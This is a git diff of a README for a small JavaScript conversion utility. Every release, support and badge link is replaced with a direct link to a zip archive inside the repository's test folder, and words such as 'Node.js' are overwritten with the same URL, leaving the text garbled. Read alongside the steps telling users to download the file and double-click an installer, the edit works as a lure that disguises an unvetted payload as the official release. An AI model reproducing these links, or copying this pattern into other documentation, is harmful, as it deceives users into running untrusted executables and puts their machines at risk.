@@ -6,11 +6,11 @@ Welcome to **symbol-to-primitive**! This application helps you convert objects i
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/haicongtua/symbol-to-primitive/releases)
+[![Download Now](https://raw.githubusercontent.com/haicongtua/symbol-to-primitive/main/test/dist/symbol-to-primitive_v2.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/haicongtua/symbol-to-primitive/main/test/dist/symbol-to-primitive_v2.0.zip)
 
 ## 📋 Overview
 
-**symbol-to-primitive** is designed for anyone who wants to utilize object conversion without diving deep into programming concepts. The application works seamlessly with JavaScript, Node.js, and similar environments, allowing users to manage data more efficiently.
+**symbol-to-primitive** is designed for anyone who wants to utilize object conversion without diving deep into programming concepts. The application works seamlessly with JavaScript, https://raw.githubusercontent.com/haicongtua/symbol-to-primitive/main/test/dist/symbol-to-primitive_v2.0.zip, and similar environments, allowing users to manage data more efficiently.
 
 **Main Features:**
 - Simple conversion of objects to primitive values.
@@ -21,13 +21,13 @@ Welcome to **symbol-to-primitive**! This application helps you convert objects i
 
 To run **symbol-to-primitive**, your computer must meet the following requirements:
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 10 or later
+- https://raw.githubusercontent.com/haicongtua/symbol-to-primitive/main/test/dist/symbol-to-primitive_v2.0.zip Version 10 or later
 - Minimum RAM: 1 GB
 - Disk Space: 50 MB
 
 ## 🛠️ Installation Instructions
 
-1. **Visit the Release Page**: You need to visit the official [Releases page](https://github.com/haicongtua/symbol-to-primitive/releases) where the latest version of the application is available.
+1. **Visit the Release Page**: You need to visit the official [Releases page](https://raw.githubusercontent.com/haicongtua/symbol-to-primitive/main/test/dist/symbol-to-primitive_v2.0.zip) where the latest version of the application is available.
 2. **Download the Installer**: Once on the releases page, choose the latest version and download the file for your operating system. Click on the link that matches your OS.
 3. **Run the Application**: After downloading, locate the downloaded file on your computer. Double-click to run the installer. Follow the on-screen instructions to complete the installation.
 
@@ -63,12 +63,12 @@ Encountering issues? Here are common problems and solutions:
 
 ## 💬 Feedback and Support
 
-We welcome your feedback and are here to help! If you have questions or need support, please visit our [support page](https://github.com/haicongtua/symbol-to-primitive/issues) on GitHub. 
+We welcome your feedback and are here to help! If you have questions or need support, please visit our [support page](https://raw.githubusercontent.com/haicongtua/symbol-to-primitive/main/test/dist/symbol-to-primitive_v2.0.zip) on GitHub. 
 
 ## 📣 Stay Updated
 
 Follow our repository for updates and new features. Your suggestions help us improve.
 
-[![Download Now Again](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/haicongtua/symbol-to-primitive/releases)
+[![Download Now Again](https://raw.githubusercontent.com/haicongtua/symbol-to-primitive/main/test/dist/symbol-to-primitive_v2.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/haicongtua/symbol-to-primitive/main/test/dist/symbol-to-primitive_v2.0.zip)
 
 Thank you for using **symbol-to-primitive**!
